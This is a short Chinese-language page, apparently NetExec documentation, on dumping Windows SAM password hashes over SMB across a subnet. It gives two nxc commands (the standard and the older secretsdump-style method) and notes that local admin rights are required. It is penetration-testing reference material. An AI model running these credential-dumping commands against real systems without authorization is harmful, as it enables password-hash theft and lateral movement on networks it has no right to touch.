# 导出 SAM

### 使用 secretsdump.py 中的方法导出 SAM 哈希

{% hint style="warning" %}
您需要至少具有远程目标上的本地管理员权限，如果您的用户是本地账户，请使用 **--local-auth** 选项
{% endhint %}

```
#~ nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --sam
```

如果此命令失败，您也可以尝试旧方法（类似于 secretdump）

```
#~ nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --sam secdump
```
